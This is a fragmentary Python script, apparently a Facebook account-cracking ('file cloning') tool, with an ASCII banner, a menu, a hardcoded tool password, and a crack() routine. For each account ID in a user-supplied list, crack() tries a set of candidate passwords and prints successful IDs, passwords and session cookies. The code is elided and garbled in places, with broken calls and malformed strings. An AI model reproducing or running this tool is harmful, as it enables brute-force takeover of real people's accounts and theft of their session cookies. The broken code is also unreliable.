...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mBIKRANT ')
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/BIKRANT -XD.txt').text
		ua=open('.bbnew.txt','w')
...
while attemps < 12345677901:
    ...
    if username == 'BIKRANT ' and password == 'PRIYANKA':
...
def banner():
	...
	print (f"""
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗ 
 _______   ______  __    __  _______    ______   __    __  ________ 
|       \ |      \|  \  /  \|       \  /      \ |  \  |  \|        \
| $$$$$$$\ \$$$$$$| $$ /  $$| $$$$$$$\|  $$$$$$\| $$\ | $$ \$$$$$$$$
| $$__/ $$  | $$  | $$/  $$ | $$__| $$| $$__| $$| $$$\| $$   | $$   
| $$    $$  | $$  | $$  $$  | $$    $$| $$    $$| $$$$\ $$   | $$   
...
def login():
	banner()
	BIKRANT j('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[4] Version 3.2\n\033[0;97m[0] \033[0;91mEXIT ')
	BIKRANT j('\033[0;97m===============================================')
	BIKRANT = input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if BIKRANT  in ['m']:
		public()
	elif BIKRANT  in ['1']:
		crack_file()
	elif BIKRANT  in ['i','0i']:
		result()
	elif BIKRANT  in ['2','02']:
		os.system('xdg-open https://www.facebook.com/BIKRANT xwd')
	elif BIKRANT  in ['0']:
...
def crack_file():
	...
	print('\033[1;32m [Put File Example:  /sdcard/BIKRANT .txt  Etc...]')
...
def setting():
	...
	os.system('espeak -a 300 " 1,  method,  UPDATED"')
	hc = input(' CHOOSE: ')
	if hc in ['1','01']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[😻PRIYANKA😻] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#BIKRANT -King
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•BIKRANT -Cp] {idf} • {pw}\n\033[0;93[🤟]= COOKIES• \033[0;92m{kuki} ')     
				...
				#BIKRANT -King
				print(f'\r\033[0;92m[BIKRANT -➼-OK😻] {idf} • {pw}\n\033[0;93m[🔥]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m===============================================')
				os.system('espeak -a 300 " BIKRANT ,  Ok,  id"')
